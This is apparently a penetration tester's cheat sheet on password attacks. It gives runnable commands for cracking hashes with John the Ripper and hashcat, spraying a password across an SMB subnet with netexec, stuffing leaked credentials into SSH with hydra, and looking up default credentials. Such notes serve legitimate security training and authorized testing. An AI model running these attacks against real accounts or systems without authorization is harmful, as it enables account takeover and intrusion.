---
title: Password Attacks
tags: [hash, password, cracking]
tools: ['john', 'hashcat', 'hasid', 'netexec', 'hydra']
---

# General Password Cracking

## John The Ripper

### Single crack mode

`Single crack mode` is a rule-based cracking technique that  is most useful when targeting Linux credentials. It generates password  candidates based on the victim's username.

```bash
# Use -n to trim /n - Alt use printf
echo -n r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash > passwd

john --single passwd
```

### Hash mode w/ wordlists

Find the hashing algorithm, attach a word list and crack

```bash
# use hashid to discover format
hashid -j 193069ceb0461e1d40d216e32c79c704

# Output to file
echo -n 193069ceb0461e1d40d216e32c79c704 > hash.txt

# Crack
john --wordlist=/usr/share/seclists/rockyou.txt --format=ripemd-128 hash.txt
```

## Hashcat

### General syntax

```shell-session
# Identify hashid, -m for hashcat
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

# -a - attack mode | -m - hash type | <hashes> string or file
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

### Attack modes

#### Dictionary attack

```bash
# Dictionary attack
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

# Dictionary attack with rules
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Mask attack

[Mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack) (`-a 3`) is a type of brute-force attack in which the keyspace is explicitly  defined by the user. For example, if we know that a password is eight  characters long, rather than attempting every possible combination, we  might define a mask that tests combinations of six letters followed by  two numbers.

`hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'`

## Spraying, Stuffing, and Defaults

### Spraying windows:

```shell-session
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

### SSH Stuffing:

Re-use creds from a different service | `username:password` credentials obtained from a database leak

```shell-session
hydra -C user_pass.list ssh://10.100.38.23
```

### Default Creds:

`````
pip3 install defaultcreds-cheat-sheet
creds search linksys
`````









